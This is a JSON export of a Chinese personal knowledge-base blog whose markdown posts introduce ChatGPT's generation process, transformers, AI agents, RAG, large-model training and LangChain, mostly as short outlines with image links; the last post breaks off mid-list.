{"9faAtEDx":"\n# 前言\n\n\n> 个人知识库合集，包括 AGI、前端、算法、计算机科学等\n\n","GAQouxss":"\n# 前言\n\n`#2023/08/25`  \n\n> 关于 AGI 的一切，努力学习中...\n","kIdoN0g1":"\n# 前言\n\n\n> AGI 入门扫盲篇\n\n","dn4yWZzB":"\n# chatGPT 是什么（篇一）\n\n`#AI`  `#chatGPT`  `#agi`  \n\n\n## 目录\n<!-- toc -->\n ## 1. chatGPT是如何回答问题的？   \n\n### 1.1. 自回归生成\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907111029.png)\n\n举个例子：输入`我`，最终返回 `我是一字小小鸟` ，看看大模型的生成过程：\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907111319.png)\n\n- 第一次\n\t- 输入：我\n\t- 输出：我是\n- 第二次\n\t- 输入：我是\n\t- 输出：我是一\n- 第三次\n\t- 输入：我是一\n\t- 输出：我是一只\n\n### 1.2. 不同的模型影响\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907111829.png)\n\n### 1.3. 两个鹦鹉🦜模型\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907112012.png)\n\n### 1.4. 学习材料的影响\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907112215.png)\n\n### 1.5. GPT 的学习能力（泛化能力）\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907114018.png)\n\n### 1.6. 大模型与数据库的对比\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907114833.png)\n\n## 2. GPT 的三个训练阶段\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907120358.png)\n\n### 2.1. 无监督学习：开卷有益\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907120518.png)\n\n### 2.2. 监督学习：模板规范\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907120656.png)\n\n### 2.3. 意外收获（涌现）\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907121049.png)\n\n有了理解能力，比如，知道**事后诸葛亮**了\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907121454.png)\n\n### 2.4. 强化学习：创意引导\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907121342.png)\n\n## 3. 总结：GPT 的基础原理\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907121705.png)\n","VaYiwlse":"\n# chatGPT 是什么（篇二）\n\n`#AI`  `#chatGPT`  `#agi`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 如何用计算机描述真实的世界？ \n\n> 一切都是二进制\n\n- 字母\n- 文本\n- 图片最终存在计算机内也是二进制\n\t- 即 `rgba()`\n- 视频\n- 其他等等\n\n计算机如何把数字（二进制）和真实的世界建立联系呢？需要两步，如下\n\n## 2. 第一步：向量化\n\n为什么要向量化，两个原因：\n- 方便电脑处理\n- 方便寻找规律\n\n### 2.1. 方便电脑处理\n\n比如，如何描述一个人现实中的人了，如下图：\n\n![图片|600](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907160925.png)\n\n### 2.2. 方便寻找规律\n\n比如看两个人的相似度，如下图\n\n![图片|488](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907161243.png)\n\n### 2.3. 更高维度\n\n![图片|544](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907161423.png)\n\n### 2.4. 初始化维度\n\n![图片|520](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907161549.png)\n\n### 2.5. 如何训练修改维度值呢？\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907162001.png)\n\n### 2.6. 大量语料训练输入，修改维度值\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907161749.png)\n\n## 3. 第二步：信息压缩和特征提取\n\n这一步，就是为了总结出**正确的规律**，计算出**正确的向量值**\n\n### 3.1. CNN\n\n现在图像识别之所以成熟，是因为找到了提取图像特征的方法，即 CNN \n\n### 3.2. RNN\n\n主要问题是会忘记前面说了啥？如下图\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907162735.png)\n\n### 3.3. TransFormer\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907163023.png)\n\n使用这种机制训练，可以让电脑**成功向量化**\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907163214.png)\n\n各自发展路线图\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907163711.png)\n\n### 3.4. OpenAI的选择\n\n#### 3.4.1. 生成\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907164539.png)\n\n#### 3.4.2. 增加参数\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240907163806.png)\n\n## 4. 涌现\n\n选择二之后，大力出奇迹\n\n","upLuHbmO":"\n# Agent 是什么？\n\n\n`#ai/agent`  `#2024/08/25`  `#agi/bot` `#agi/agent` \n\n\n## 目录\n<!-- toc -->\n ## Agent 的起源 \n\n- **AutoGPT** 等开源项目的发布，这是第一批**基于自然语言的 AI 自动化实践**\n\t- 你告诉它一个任务，它就会通过自然语言的自我对话，将这个任务进行拆分、规划并实现。\n- 给予不同的 Bot 以不同的人格，搭配记忆窗口，让它们之间相互对话。\n- 大模型从原来的“**思想家**”，通过对外部工具的使用，变成了**实干家**。\n\n## 什么是 Agent\n\n- 一个常见的观点是，**Agent 是一种让 AI 以类似人的工作和思考方式，来完成一系列的任务**\n\n![图片|720](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825191527.png)\n\n## Agent 的决策流程\n\n### 基本决策流程\n\n![图片|920](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825193026.png)\n\n### 举个例子\n\n![图片|880](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825193142.png)\n\n## Agent 的组成\n\n包括 4 个部分\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825193325.png)\n\n### ① 大脑（LLM） \n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825193426.png)\n\n### ② 规划 （Planning）\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825193517.png)\n\n### ③ 记忆（memory）\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825193652.png)\n\n### ④ 工具使用（use Tool）\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825193721.png)\n\n## Agent 与 Bot 的关系 \n\n### 定义\n\n- AI Agent（AI代理）\n\t- AI Agent 是一个具有自主决策能力、可以感知环境、学习适应并追求特定目标的智能系统。\n- AI Bot（AI机器人）\n\t- AI Bot 是一个专注于执行特定任务、通常基于预定规则运作的自动化程序。\n\n### 演变与融合\n\n- **重叠**：在某些情况下，Bot 可以被视为 Agent 的一种。\n\t- 例如，一个聊天机器人（Chatbot）可以被认为是一个 Agent，因为它能够与用户进行交互并提供信息或服务。\n- **相互影响**：随着技术的发展，许多 Bot 开始具备更多的 Agent 特性，例如通过机器学习实现的自主决策能力。\n- 一个 Agent 可以是**一个 Bot**，也可以是**多个 Bot 的协同**\n\t- 就像是职场里，简单的工作独立完成，复杂的工作协作完成一样\n\n### 实现的技术栈对比\n\n- Agent技术栈：\n    - 深度学习\n    - 强化学习\n    - 自然语言处理（NLP）\n    - 计算机视觉\n    - 知识图谱\n    - 多模态AI\n- Bot技术栈：\n    - 规则引擎\n    - 简单的机器学习模型\n    - 基本的NLP（如关键词匹配）\n    - API集成\n    - 工作流自动化\n\n### 从 AI 应用的角度看\n\n- Agent 代表了更高级、更复杂的AI系统\n- 而Bot则是更专门化、任务导向的AI工具\n\n随着技术的发展，这两个概念之间的界限正在逐渐模糊，我们看到了更多的混合系统，结合了**Bot的效率**和**Agent的智能**。\n\n## Bot 的组成\n\n对于每个 Bot 来说，可能会包括：\n- **一个大脑**：判断和规划行为，这里通常用 GPT-4 或 同水平的 **LLM**；\n- **眼睛和手**：确认信息和使用外部工具，一般是**各种插件/action/api**；\n- **工作纪要**：储存已经发生的事\n\t- 通常的媒介是上下文窗口\n\t- 或者数据库；  \n- **行为SOP**：明确这个 Agent 的身份、任务、目标和机制。\n\t- 这个 SOP 可能是用户给的\n\t- 也可能是由其它 Bot 给出的。\n\n再具象一点，这里我从 GPTs 里截了个图：\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825194356.png)\n\n## OpenAI 的 Agent 演进\n\n### 开发文档中的 Fuction Call \n\n OpenAI 给开发者发送的指引中，给了这样的 Todo\n- **第一步**：开发接口，来定义 ChatGPT 可以调用的功能\n\t- 接口可以是新开发的\n\t- 也可以是改造现有的\n- **第二步**：写一份文档，**给 ChatGPT 来看，让它知道什么时候去调用接口**。\n\t- 当然，这里要遵循一定的格式，然后用自然语言来写。\n\n如果你做过 OpenAI API 的开发，可能会觉得这个文档有些熟悉，这不就是 Fuction Call 吗？详见下文 [#AI 和 LLM 上下文中的 Function Call](/post/upLuHbmO.html#AI-和-LLM-上下文中的-Function-Call)\n\n没错，在 2023 年 6 月 13 日，OpenAI 发布了 Function Call 模式，让大模型可以来调用外部工具，用的就是非常类似的方案。\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825202454.png)\n\n#### 传统编程中的 Function Call\n\n在传统的编程中，Function Call 指的是调用（执行）一个预定义的函数或方法的过程。这个过程包括：\n- 将控制权转移到被调用的函数\n- 可能传递参数给函数\n- 执行函数内的代码\n- 可能返回一个值\n- 将控制权返回给调用者\n\n#### AI 和 LLM 上下文中的 Function Call\n\n在 AI 和大型语言模型的背景下，Function Call 有了更广泛的含义。它通常指的是模型==能够识别何时需要调用外部函数或 API 来完成特定任务的能力==。这个概念特别适用于像 GPT-3.5 和 GPT-4 这样的语言模型。\n\n在这个上下文中，Function Call 涉及：\n- 模型理解用户的请求\n- 识别需要外部数据或功能的情况\n- 生成调用特定函数的请求\n- **解释函数返回的结果并将其整合到响应中**\n\n示例应用，如下图：\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825200333.png)\n\n### GPTS  Store 的推出\n\n之后，ChatGPT 推出了 All Tools 功能。**也就是回答用户问题时，不再需要用户自主的来选择工具**，这可以视作是“**自动版的Plugin**”，覆盖了三款官方工具Browsing，Advanced Data Analysis ，DALL·E，如下图\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825200846.png)\n\n时间推移，在2023 年 11 月 6 日的时候，在 OpenAI 开发者大会上，Sam Altman 宣布了 **GPTs**，这通常被认为是 OpenAI 推出了其第一个正式版的 AI Agent。在最初的版本中，包括以下功能\n\n- 允许用户创建多个 Bot，自定义它们的身份和回答风格。并且这些 Bot 可以分享\n- Bot 可以自有使用三款官方工具：Browsing, Advanced Data Analysis 和 DALL·E\n- Bot 也可以通过 Action 的方式（类似 API 的东西），去调用任何的外部能力\n- Bot 可以有自己的数据空间，允许用户对这些数据进行 QA\n\t- 比如，我上传了 OpenAI 的开发文档，帮助开发者快速生成 OpenAI 的调用代码\n\n同时，在11月06日的时候，OpenAI 也更新了几个影响深远的接口：\n\n- **Function Calling**：更新多参数生成功能，可以让一轮对话完成多项任务\n- **JSON Mode**：让 API 通过 JSON，而非文字，来做出回应\n- **Seed**：设定随机值，提高一致性\n- **Assistants API & Code Interpreter**：可以理解为把 ChatGPT 的 Bot，搬到了 API 里\n- **Retrieval**：简易化知识库构建\n\n在最近 GPTs  体系上线了 GPT Store，有些媒体称其为 OpenAI 的 App Store 时刻，但其实并不相同。在 GPT Store 里，用户可以搜索和使用为各项任务所开发的 GPTs。\n\n### @GPTs 功能\n\n紧随 GPT Store 上线的，还有 `@GPTs 功能`，也就是在任何的对话中，你都可以手动的让某个 GPTs 接管这个对话内容，做出更好的输出。\n\n## 其它 Agent 平台\n\n之前和 OpenAI 的相关负责人聊过，ChatGPT 的主要定位是“开箱即用的消费级产品”。那这里，自然给“较为复杂的生产级产品”留下了生态空间。这里，我们也来探讨下这类产品。\n\n主要的 AI 玩家都会对这方面有所涉足，也各有侧重。比如\n- 传统大厂自字节扣子/coze\n- 百度的灵境矩阵\n- 也比如来自 AI 初创公司的 Dify 等等。\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825202340.png)\n\n以扣子为例，对比与 GPTs Store，主要的体感区别包括：\n\n- 免费，至少目前是完全免费的\n- 有数十个官方插件，对比与 GPTs 里只有3个\n- 可以用类似低代码的方式，构建 Workflow，并被 Bot 调用  \n- 可以将捏好的 Bot 发布到其它平台（比如飞书，公众号），同时支持 API\n\n**其中后两条极为核心**。  \n\n## Agent 的实战\n\n一个设计良好的 Agent 可以提供极大的生产力，并创造极高的价值。\n\n前几天大火的 **Devin**，被称为“第一位由 AI 担任的软件工程师”，它可以自主的去学会如何使用不熟悉的技术，自主的生成代码、调试bug和部署应用。\n\nAgent 也可以替代现有的很多软件工具，去完成工作中繁琐的任务。\n\n> **是否可以把写这篇文章的过程，查阅什么资料，如何排版，如何发布，直接搞成个 Agent，来帮我完成这些事情，其实已经是可以的了。**\n\n## Agent 的问题\n\n![图片|888](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825192813.png)\n\n在 AGI 来之前，Agent 是一个很棒的替代方案。不过现在还有俩主要毛病：\n1. 不够稳定；\n2. 算力有点贵\n\n所以，这就需要 **Agent 工程**来解决这个问题\n\n## 参考\n\n- https://mp.weixin.qq.com/s/xQPmiEfFOOp8R5zgTcYHDA\n- https://www.yuque.com/r/note/1cec57e4-386c-49f2-982a-4e531b875a5d\n","U5tfNeeS":"\n# Agent 工程架构图\n\n\n`#agi/agent`   `#2024/08/25`  `#ai`   \n\n\n## 目录\n<!-- toc -->\n ## 1. Agent 的工程架构图（基础） \n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825204007.png)\n\n### 1.1. 解释 ①：RPA \n\n![图片|712](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825205021.png)\n\n#### 1.1.1. 关键技术\n\n![图片|696](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825205210.png)\n\n### 1.2. 解释 ② ： RAG\n\nRAG（Retrieval-Augmented Generation，检索增强生成）是一种先进的自然语言处理技术，它结合了信息检索和文本生成的优势。\n#### 1.2.1. 定义\n\nRAG是一种混合方法，它将**大型语言模型（LLM）的生成能力**与**外部知识库的检索功能**相结合。这种方法允许AI系统在生成响应时，不仅依赖于其预训练的知识，还能利用最新的、特定领域的信息。\n\n> 通过在生成文本时利用外部知识库或文档来增强生成模型的性能\n\n#### 1.2.2. 工作原理（三个阶段）\n\n- 检索阶段：系统从外部知识库中检索与用户查询相关的信息。\n- 增强阶段：将检索到的信息与原始查询结合。\n- 生成阶段：利用增强后的信息，生成最终的响应。\n\n#### 1.2.3. 应用场景\n\n- 聊天机器人和客户服务：提供更准确、最新的信息。\n- 内容创作：辅助写作，提供相关背景信息。\n- 知识管理系统：整合和利用企业内部知识。\n- 教育和培训：个性化学习体验。\n- 医疗保健：提供最新的医学信息和诊断支持。\n\n#### 1.2.4. RAG的优势\n\n- 提高准确性：通过访问外部知识库，**减少\"幻觉\"（生成虚假信息）的可能性**。\n- 实时更新：能够利用最新信息，不受模型训练时间的限制。\n- 可解释性：可以追踪生成内容的来源，增加透明度。\n- 定制化：可以根据特定领域或组织的需求定制知识库。\n- 降低成本：相比完全重新训练大型模型，RAG提供了一种更经济的方式来扩展AI系统的知识\n\n#### 1.2.5. 实现RAG的技术要求\n\n- 向量数据库：用于高效存储和检索信息。\n- 嵌入模型：将文本转换为向量表示。\n- 大型语言模型：用于生成最终响应。\n- 检索算法：如语义搜索，用于找到最相关的信息\n- **信息检索的效率**：需要快速检索大量文档以保持系统的实时性。\n- **信息质量和可靠性**：确保检索到的信息是准确和可信的。\n#### 1.2.6. 挑战和未来趋势\n\n- 信息质量控制：确保检索的信息准确可靠。\n- 实时性能优化：在大规模应用中保持快速响应。\n- 多模态RAG：整合文本、图像、音频等多种类型的信息。\n- 与其他AI技术的融合：如强化学习、因果推理等。\n\nRAG技术通过结合检索和生成，提供了一种强大的方法来提升自然语言处理任务的性能，**尤其是在需要动态知识更新的应用中**\n\n### 1.3. 解释 ③：Agent 套娃\n\n#### 1.3.1. 定义\n\n\"套娃\"这个比喻可能指的是多层嵌套或递归的Agent结构。在这种结构中，一个Agent可能包含或调用其他Agent，形成一个层级结构，类似于俄罗斯套娃玩具\n\n在应用在AI中，套娃这个概念可以用来描述一种系统架构，其中一个**智能代理（Agent）** 包含或管理其他**子代理（Sub-agents）**，形成一个嵌套的、层级化的结构。\n\n**举个例子**\n\n在一个智能家居系统中，\"**管理家庭能源**\"这个目标可以分解成多个**子任务**：\n- **监控能源使用情况:** 由一个专门的Agent负责收集和分析家庭用电数据。\n- **自动调节电器：** 根据用电情况和用户习惯，自动开关空调、调节灯光亮度等。\n- **与用户交互：** 通过语音助手或手机App，让用户了解家庭能源使用情况，并提供节能建议。\n\n每个子任务都可以由一个独立的Agent来完成，它们相互配合，共同实现\"管理家庭能源\"这个总目标。\n\n#### 1.3.2. Agent套娃的原理\n\n- 层级结构：一个高级Agent可能管理和协调多个子Agent。\n- 任务分解：复杂任务被分解成更小的子任务，由不同的专门Agent处理。\n- 信息传递：Agent之间通过消息传递进行通信和协作\n\n#### 1.3.3. 应用场景\n\n- 复杂问题解决：通过多个专门Agent的协作来解决复杂问题。\n- 知识整合：不同领域的Agent可以结合各自的专业知识。\n- 灵活性和可扩展性：可以根据需要添加或移除Agent。\n\n#### 1.3.4. 技术实现\n\n- LangChain 等框架可用于构建和管理多Agent系统。\n- ReAct（Reasoning and Acting）机制被用于增强Agent的推理和行动能力\n#### 1.3.5. 优势\n\n- 模块化：每个Agent可以专注于特定任务。\n- 可扩展性：易于添加新功能或知识领域。\n- 鲁棒性：单个Agent失效不会导致整个系统崩溃。\n#### 1.3.6. 技术挑战\n\n- 协调**复杂性**：管理多个Agent之间的交互可能变得复杂。\n- **一致性**维护：确保不同Agent之间的信息和行动保持一致。\n\t- **通信开销**： Agent 之间的通信可能增加系统的负担\n- **性能**开销：多层Agent可能增加系统的响应时间和资源消耗。\n\n> 值得注意的是，OpenAI推出的 **GPTs** 虽然被一些人视为Agent，但它们与传统意义上的AI Agent有所不同。**GPTs更像是预配置的大语言模型，而不是完全自主的Agent**\n\n## 2. Agent 与其他模块的关系图\n\n![图片|944](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825211647.png)\n\n### 2.1. 更多 bot（agent）协同关系图\n\n![图片|872](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825211817.png)\n\n如上图，这就形成了上文中（[#解释 ③：Agent 套娃](/post/U5tfNeeS.html#解释-③Agent-套娃)）的**套娃**\n\n## 3. Agent 的迭代范式\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825211502.png)\n\n## 4. 参考\n\n- https://waytoagi.feishu.cn/wiki/QSVJwSkMfijmeZkcUSnckVXhnnd\n\n","BVpvooHc":"\n# Agent 的进化之路\n\n`#2024/08/25` `#ai/agent`  `#agi/agent`  `#ai` \n\n\n## 目录\n<!-- toc -->\n ## 1. AI 的职业发展规划 \n\nAI 的 **晋升职级** 之路 （L1~L5 ）\n\n![图片|864](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825213157.png)\n\n- ① 现在用的 `github copilot`  只是第 L3，这就是所谓的**助手（Copilot）**\n- ② 自己慢慢需要学会 Agent 工程开发，这就是所谓的 **Agent（智能体）**\n- ③ 到这个职级，还早吗？ 通用人工智能\n\n## 2. Copilot（L3） 和 Agent（L4） 的区别\n\n![图片|776](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825213742.png)\n\n> 现在自己算个大学生毕业吧，当前职级是 L3 ，干吧，先晋升到 L4，才有活路\n\n## 3. 作为码农的你，如何进化，不被淘汰？\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825212810.png)\n\n> [!warning]\n> 是的好好学习 Agent 工程，实现 AGI 之前，好好学习开发 Agent 工程吧\n\n## 4. 参考\n\n- https://waytoagi.feishu.cn/wiki/QSVJwSkMfijmeZkcUSnckVXhnnd\n\n","w8u3Ua9q":"\n# 大模型是如何训练的？\n\n`#AI`  `#chatGPT`  `#agi`   `#大模型`\n\n\n## 目录\n<!-- toc -->\n ## 1. 先看看大模型自己的回答 （sonnet） \n\n大模型的训练是一个复杂而资源密集的过程。以下是大模型训练的主要步骤和关键点:\n\n1. 数据准备\n\t- 收集海量高质量文本数据,通常是**数百GB到TB级别**\n\t- 对数据进行清洗、标准化和预处理\n\t- 构建词表,将文本转换为模型可处理的数字序列\n2. 模型设计  \n\t- 选择合适的**模型架构**,如Transformer\n\t- 确定模型规模,包括层数、隐藏单元数等超参数\n\t- 设计训练目标,如语言模型、掩码语言模型等\n3. 分布式训练\n\t- 使用**大规模GPU/TPU集群**进行并行训练\n\t- 采用**数据并行**、**模型并行**等技术提高训练效率\n\t- 使用混合精度训练、梯度累积等方法节省显存\n4. 优化策略\n\t- 选择合适的优化器,如Adam\n\t- 设计学习率调度策略\n\t- 使用梯度裁剪等技术稳定训练\n5. 训练过程\n\t- 迭代训练数百万到数十亿步\n\t- 监控损失、困惑度等指标\n\t- 定期保存检查点,以便恢复训练\n6. 评估与改进\n\t- 在验证集上评估模型性能\n\t- 分析模型输出,找出不足之处\n\t- 调整超参数、数据或模型结构进行优化\n7. 部署与应用\n\t- 模型压缩和量化\n\t- 部署到推理服务器\n\t- 针对下游任务进行微调\n\n整个过程需要大量的计算资源、专业知识和反复实验。训练一个大规模语言模型可能需要\n- 数周到数月的**时间**\n- **成本**可达数百万美元。\n\n## 2. 为什么要花这么大的成本训练？\n\n因为：\n\n![图片|688](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908214209.png)\n\n## 3. 先在单机上训练？\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908214440.png)\n\n这得多好单机性能，完全搞不定啊\n\n## 4. 多机器训练\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908214659.png)\n\n## 5. 训练大模型需要考虑哪些工程实现方面的挑战?\n\n![图片](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908215117.png)\n\n> B 站上看的一个视频其实只是冰山一角，需要考虑的东西那太多了\n\n训练大模型确实面临许多工程实现方面的挑战。以下是一些主要需要考虑的方面:\n\n1. 计算资源管理\n\t- 高效调度和利用大规模GPU/TPU集群\n\t- 处理硬件故障和节点失效\n\t- 优化计算和通信的平衡\n2. 内存和存储优化\n\t- 管理巨大的模型**参数和中间状态**\n\t- 优化数据加载和预处理流程\n\t- 处理检查点保存和恢复\n3. 网络通信\n\t- 优化设备间的数据传输\n\t- 处理网络延迟和带宽限制\n\t- 实现高效的集合通信原语\n4. 分布式训练框架\n\t- 选择和配置合适的分布式训练框架(如PyTorch DDP, DeepSpeed等)\n\t- 实现自定义的分布式训练策略\n\t- 确保不同**设备间的同步和一致性**\n5. 数据管理\n\t- 高效处理和存储TB级别的训练数据\n\t- 实现动态数据加载和预处理\n\t- 确保数据的质量和多样性\n6. 监控和调试\n\t- 实时监控训练进度和硬件状态\n\t- 诊断和解决分布式环境中的问题\n\t- 收集和分析大规模训练日志\n7. 模型评估和分析\n\t- 设计和实现大规模模型的评估流程\n\t- 分析模型性能和行为\n\t- 可视化和解释模型输出\n8. 版本控制和实验管理\n\t- 管理复杂的代码库和配置\n\t- 追踪和复现实验结果\n\t- 协调多人协作的开发过程\n9. 部署和服务\n\t- 将训练好的大模型高效部署到生产环境\n\t- 优化推理性能和延迟\n\t- 实现模型更新和版本控制\n10. 安全性和隐私\n\t- 保护训练数据和模型参数的安全\n\t- 实现联邦学习等隐私保护技术\n\t- 防范对抗性攻击和模型窃取\n11. 成本控制\n\t- 优化计算资源使用,降低训练成本\n\t- 评估不同训练策略的成本效益\n\t- 管理云服务和硬件资源的预算\n12. 可扩展性设计\n\t- 设计能够适应不同规模模型的训练系统\n\t- 实现模块化和可配置的训练流程\n\t- 为未来更大规模的模型做准备\n\n- 这些挑战需要**深厚的系统工程知识、分布式计算经验以及对机器学习的深入理解**。\n- 成功训练大模型通常需要一个多学科团队的紧密合作,包括机器学习研究者、系统工程师、硬件专家等。\n- 随着模型规模的不断增长,这些挑战也在不断演变,推动着相关技术的持续创新。\n\n","7R3JOmn3":"\n# LangChain（篇一：基础入门篇）\n\n`#langchain` `#ai/agent`  `#2024/09/08` \n\n\n## 目录\n<!-- toc -->\n ## 1. 简介 \n\n**LangChain** 是一个基于大型语言模型（LLM）开发应用程序的框架。\n- 提供了从开发到部署的完整生命周期支持，包括模型 I/O、聊天、函数回调、消息类型、输出解析等核心模块。\n- 它通过**开源库和第三方集成**简化了应用程序的构建和生产化过程。\n- LangChain 还提供了强大的**工具和组件**，如 LangSmith、LangGraph 和 LangServe，用于调试、测试、评估和部署应用程序\n\n## 2. LangChain 的整体架构图\n\n\n![图片|1040](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240908213145.png)\n\n## 3. 核心模块和工具简介\n\n1. 模型 I/O（Model I/O）：\n   - 功能：处理与语言模型的输入和输出。\n   - 组件：\n     - 提示模板（Prompt templates）：用于结构化输入到语言模型。\n     - 语言模型（Language models）：包括对各种 **LLM 提供商**的集成。\n     - 输出解析器（Output parsers）：将模型输出转换为结构化格式。\n2. 数据连接（Data Connection）：\n   - 功能：管理和操作应用程序使用的数据\n   - 组件：\n     - 文档加载器（Document loaders）：从各种源加载文档。\n     - 文档转换器（Document transformers）：处理和转换文档。\n     - 文本嵌入模型（Text embedding models）：将文本转换为向量表示。\n     - 向量存储（Vector stores）：存储和检索向量化文本。\n3. 记忆（Memory）：\n   - 功能：管理对话历史和上下文。\n   - 类型：\n     - 对话缓冲记忆（Conversation buffer memory）\n     - 摘要记忆（Summary memory）\n     - 长期记忆（Long-term memory）\n4. 链（Chains）：\n   - 功能：组合多个组件以完成复杂任务。\n   - 示例：\n     - LLM链（LLM Chain）：将提示模板与语言模型结合。\n     - 检索QA链（Retrieval QA Chain）：结合检索和问答功能。\n5. 代理（Agents）：\n   - 功能：实现动态决策和工具使用。\n   - 类型：\n     - ReAct 代理：结合推理和行动。\n     - 自我提问代理（Self-ask agent）：能够提出和回答自己的问题。\n     - 计划和执行代理（Plan and execute agent）：制定计划并执行任务。\n6. 回调（Callbacks）：\n   - 功能：提供钩子以在链和代理执行期间运行自定义代码。\n   - 用途：日志记录、监控、调试等。\n7. 索引（Indexes）：\n   - 功能：组织和检索大量文本数据。\n   - 类型：\n     - 向量索引（Vector index）\n     - 树索引（Tree index）\n8. 检索器（Retrievers）：\n   - 功能：从各种数据源检索相关信息。\n   - 示例：向量存储检索器、网络检索器。\n9. LangChain 表达式语言（LCEL）：\n   - 功能：提供声明式方法来组合 LangChain 组件。\n   - 优势：简化复杂应用的构建，提高可读性和可维护性。\n10. 工具和集成：\n    - 功能：提供与各种外部服务和 API 的集成。\n    - 示例：搜索引擎、计算器、天气 API 等。\n11. LangSmith：\n    - 功能：用于调试、测试、评估和监控 LLM 应用。\n    - 特点：提供可视化界面、性能分析、版本控制等。\n12. LangServe：\n    - 功能：将 LangChain 应用部署为 **REST API**。\n    - 优势：简化部署过程，提供标准化的接口。\n13. LangGraph：\n    - 功能：用于构建和管理复杂的**多代理系统**。\n    - 用途：创建更复杂、交互式的 AI 应用。\n\n这些核心模块和工具共同构成了 LangChain 的强大生态系统，使开发者能够快速构建、测试和部署复杂的 LLM 应用。它们提供了从数据处理、模型交互到应用部署的全面解决方案，大大简化了 AI 应用开发的复杂性。\n\n通过这些模块和工具，开发者可以：\n- 轻松管理与 LLM 的交互\n- 高效处理和检索大量数据\n- 